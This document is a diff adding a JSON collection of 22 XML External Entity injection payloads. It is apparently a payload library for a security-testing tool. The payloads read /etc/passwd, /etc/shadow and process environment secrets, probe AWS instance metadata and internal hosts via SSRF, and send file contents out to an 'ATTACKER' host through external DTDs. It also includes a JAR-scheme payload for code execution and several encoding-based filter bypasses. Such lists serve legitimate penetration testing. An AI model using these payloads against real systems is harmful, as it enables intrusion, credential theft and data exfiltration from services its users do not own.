@@ -1,0 +1,39 @@
+{
+  "meta": {
+    "name": "XXE Injection",
+    "icon": "🗃️",
+    "description": "XML External Entity injection payloads. Covers local file read, SSRF via XXE, blind OOB exfiltration via DNS/HTTP, parameter entity techniques, and XXE in various content types.",
+    "version": "1.0",
+    "updated": "2026-03-04",
+    "total": 22
+  },
+  "payloads": [
+    {"id":1,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>","description":"Classic XXE LFI — reads /etc/passwd and includes it in the XML response","category":"basic","platform":["any"],"tags":["xxe","lfi","passwd","classic"]},
+    {"id":2,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/shadow\">]><foo>&xxe;</foo>","description":"XXE reads /etc/shadow — hashed passwords (requires root privileges)","category":"basic","platform":["any"],"tags":["xxe","lfi","shadow","sensitive"]},
+    {"id":3,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///proc/self/environ\">]><foo>&xxe;</foo>","description":"XXE reads process environment — may expose secrets, API keys, DB credentials","category":"basic","platform":["any"],"tags":["xxe","lfi","environ","sensitive"]},
+    {"id":4,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/windows/win.ini\">]><foo>&xxe;</foo>","description":"Windows XXE LFI — reads win.ini to confirm exploitation on Windows hosts","category":"basic","platform":["windows"],"tags":["xxe","lfi","windows","win.ini"]},
+    {"id":5,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///C:/boot.ini\">]><foo>&xxe;</foo>","description":"Windows boot.ini read — older Windows systems, confirms LFI","category":"basic","platform":["windows"],"tags":["xxe","lfi","windows","boot.ini"]},
+
+    {"id":6,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://ATTACKER/\">]><foo>&xxe;</foo>","description":"XXE SSRF — triggers outbound HTTP request to attacker-controlled server","category":"ssrf","platform":["any"],"tags":["xxe","ssrf","http","oob"]},
+    {"id":7,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>","description":"XXE SSRF to AWS EC2 IMDSv1 — reads cloud instance metadata","category":"ssrf","platform":["any"],"tags":["xxe","ssrf","aws","imds","cloud"]},
+    {"id":8,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://192.168.1.1/\">]><foo>&xxe;</foo>","description":"XXE SSRF to internal network — probes internal hosts not accessible externally","category":"ssrf","platform":["any"],"tags":["xxe","ssrf","internal","network"]},
+    {"id":9,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://localhost:8080/admin\">]><foo>&xxe;</foo>","description":"XXE SSRF to localhost — accesses admin panels or internal APIs","category":"ssrf","platform":["any"],"tags":["xxe","ssrf","localhost","internal"]},
+
+    {"id":10,"code":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % file SYSTEM \"file:///etc/passwd\"><!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>\">%eval;%exfil;]><data/>","description":"Blind XXE OOB HTTP exfil — exfiltrates file content via URL query parameter","category":"blind-oob","platform":["any"],"tags":["xxe","blind","oob","http","exfil"]},
+    {"id":11,"code":"<?xml version=\"1.0\"?><!DOCTYPE data [<!ENTITY % xxe SYSTEM \"http://ATTACKER/evil.dtd\">%xxe;]><data/>","description":"Blind XXE via external DTD — loads attacker DTD which defines exfil entity","category":"blind-oob","platform":["any"],"tags":["xxe","blind","oob","dtd","external"]},
+    {"id":12,"code":"<!ENTITY % file SYSTEM \"file:///etc/passwd\">\n<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://ATTACKER/?x=%file;'>\">\n%eval;\n%exfil;","description":"External DTD file content (host at ATTACKER/evil.dtd) — combines with blind XXE payload #11","category":"blind-oob","platform":["any"],"tags":["xxe","dtd","exfil","oob"]},
+    {"id":13,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM \"http://ATTACKER/\">%xxe;]><foo></foo>","description":"Blind XXE DNS/HTTP detection probe — any response confirms XXE","category":"blind-oob","platform":["any"],"tags":["xxe","blind","detection","oob"]},
+
+    {"id":14,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM \"http://ATTACKER/xxe.dtd\">%remote;%intern;%trick;]><foo></foo>","description":"Parameterized XXE error-based exfil chain — uses error messages to leak file content","category":"parameter-entity","platform":["any"],"tags":["xxe","parameter-entity","error-based","exfil"]},
+    {"id":15,"code":"<?xml version=\"1.0\"?><!DOCTYPE replace [<!ENTITY ent \"dead\"> <!ENTITY % param1 '<!ENTITY ent2 \"%ent;\">'>%param1;]><replace>&ent2;</replace>","description":"Nested parameter entity test — checks if double-nested param entities are evaluated","category":"parameter-entity","platform":["any"],"tags":["xxe","parameter-entity","nested"]},
+
+    {"id":16,"code":"--boundary\nContent-Disposition: form-data; name=\"file\"; filename=\"test.xml\"\nContent-Type: application/xml\n\n<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>","description":"XXE in multipart file upload — inject XXE in XML uploaded as a file","category":"content-type","platform":["any"],"tags":["xxe","upload","multipart"]},
+    {"id":17,"code":"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"[\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]><svg>&xxe;</svg>","description":"XXE in SVG upload — SVG files support DOCTYPE; useful in image upload endpoints","category":"content-type","platform":["any"],"tags":["xxe","svg","upload","image"]},
+    {"id":18,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"jar:http://ATTACKER/payload.jar!/\">]><foo>&xxe;</foo>","description":"JAR URI scheme XXE — uploads attacker JAR to trigger RCE in some Java parsers","category":"content-type","platform":["java"],"tags":["xxe","jar","java","rce"]},
+
+    {"id":19,"code":"<?xml version=\"1.0\" encoding=\"UTF-7\"?>+ADwAIQ-DOCTYPE foo [+ADwAIQ-ENTITY xxe SYSTEM \"file:///etc/passwd\"+AD4AXQ->+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4-","description":"XXE with UTF-7 encoding bypass — evades parsers that only check for UTF-8 DOCTYPE","category":"filter-bypass","platform":["any"],"tags":["xxe","bypass","utf7","encoding"]},
+    {"id":20,"code":"<?xml version=\"1.0\"?><!DOCTYPE test [ <!ENTITY % init SYSTEM \"data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk\"> %init; ]><foo/>","description":"XXE via data URI base64 — 'data://text/plain;base64,...' encodes 'file:///etc/passwd'","category":"filter-bypass","platform":["any"],"tags":["xxe","bypass","data-uri","base64"]},
+    {"id":21,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo SYSTEM \"http://ATTACKER/xxe.dtd\"><foo/>","description":"DTD via SYSTEM identifier — loads external DTD without inline entity declaration","category":"filter-bypass","platform":["any"],"tags":["xxe","dtd","external","bypass"]},
+    {"id":22,"code":"<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\">]><foo>&xxe;</foo>","description":"PHP filter stream wrapper in XXE — base64-encodes file to avoid special chars in XML","category":"filter-bypass","platform":["php"],"tags":["xxe","php","filter","base64"]}
+  ]
+}
